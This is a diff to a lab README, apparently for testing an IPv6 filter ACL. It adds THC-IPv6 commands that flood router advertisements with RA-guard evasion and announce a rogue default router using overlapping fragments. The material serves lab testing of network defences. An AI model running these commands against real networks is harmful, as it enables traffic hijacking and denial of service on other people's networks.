@@ -49,6 +49,11 @@ Prerequisites, libraries, OS version, etc., needed before running lab.
 To check the IPv6 filter ACL, run these examples:
 * Description: Announce yourself as a router and try to become the default router.
   * PC1#atk6-fake_router6 eth1 2001:db8:bbbb:1::/64
+* Description: Flood the local network with router advertisements. Option -F (perform full RA guard evasion, disallows all other bypass options)
+  * PC1#ifconfig eth1 mtu 1500 up
+  * PC1#atk6-flood_router26 eth1 -F
+* Description: Announce yourself as a router and try to become the default router. Option -E o (overlapping fragments for keep-last targets)
+  * PC1#atk6-fake_router26 eth1 -E o -A 2001:db8:dddd:1::/64
 
 
 ## Authors
